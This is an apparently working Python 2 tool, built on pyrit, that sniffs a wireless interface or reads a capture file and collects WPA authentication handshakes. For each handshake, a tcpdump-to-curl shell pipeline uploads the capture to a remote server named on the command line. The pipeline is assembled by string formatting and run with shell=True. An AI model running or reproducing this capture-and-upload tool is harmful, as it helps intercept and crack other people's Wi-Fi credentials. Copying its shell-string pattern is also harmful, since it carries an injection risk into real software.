import cpyrit.pckttools
import subprocess
import multiprocessing
import os
import exceptions

import argparse
import sys
import tempfile
import time
import logging

# TODO: upload ccmp encrypted packets
# TODO: pyrit reports the same auth multiple times, avoid it (debounce)
# TODO: upload only the relevant packets (those of the specific ap)
# TODO: use native python (httplib, urllib, libpcap) instead of
# TODO: Popen/tcpdump/curl


class StripLoad(multiprocessing.Process):

    def __init__(self, iface, server):
        multiprocessing.Process.__init__(self)
        self._outfile = tempfile.NamedTemporaryFile()
        self._iface = iface
        self._server = server
        self._writer = cpyrit.pckttools.Dot11PacketWriter(self._outfile.name)
        self._parser = cpyrit.pckttools.PacketParser()

        self._parser.new_ap_callback = self._new_ap_callback
        self._parser.new_keypckt_callback = self._new_keypckt_callback
        self._parser.new_auth_callback = self._new_auth_callback

        self._pckt_rdr = cpyrit.pckttools.PcapDevice(use_bpf=True)

        self._uploaded_queue = multiprocessing.Queue()
        self._uploaded = set()

    def _new_ap_callback(self, ap):
        self._writer.write(ap.essidframe)

    def _new_keypckt_callback(self, (_sta, _idx, pckt)):
        self._writer.write(pckt)

    def _new_auth_callback(self, (sta, auth)):
        logging.info("got new hs of %s (%d)" % (str(sta.ap.mac), auth.quality))
        cmd_str = "/usr/sbin/tcpdump -r %s -w - | " \
                  "/usr/bin/curl --form \"upfile=@-;filename=%s.dump\" " \
                  "http://%s:%d" % (self._outfile.name, str(sta.ap.mac),
                                    self._server[0], self._server[1])
        p = subprocess.Popen(cmd_str,
                             stdout=open(os.devnull, 'w'),
                             stderr=subprocess.STDOUT, shell=True)
        p.wait()
        if auth.quality == 0:
            self._uploaded_queue.put(sta.ap.mac)

    def run(self):
        try:
            self._pckt_rdr.open_offline(self._iface)
        except IOError:
            self._pckt_rdr.open_live(self._iface)
        self._parser.parse_pcapdevice(self._pckt_rdr)

    def wait_load(self, target, timeout):
        """
        wait till the specified target is uploaded
        :param target: the target to wait for
        :param timeout: maximum time to wait
        :return: None
        """
        start_time = time.time()
        if target in self._uploaded:
            return

        wait = timeout - (time.time() - start_time)
        while wait > 0:
            try:
                mac = self._uploaded_queue.get(timeout=wait)
                logging.info("%s uploaded" % str(mac))
                logging.debug("+ %s, %s" % (str(target.bssid), str(mac)))
                self._uploaded.add(mac)
                if target.bssid.lower() == mac.lower():
                    return
            except multiprocessing.queues.Empty:
                break
            wait = timeout - (time.time() - start_time)

        raise exceptions.Exception("timeout")


def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("capfile", metavar="interface_or_capfile")
    parser.add_argument("server_ip", type=str)
    parser.add_argument("server_port", type=int)
    parsed = parser.parse_args(args[1:])
    p = StripLoad(parsed.capfile, (parsed.server_ip, parsed.server_port))
    p.start()
    p.join()

if __name__ == "__main__":
    sys.exit(main(sys.argv))
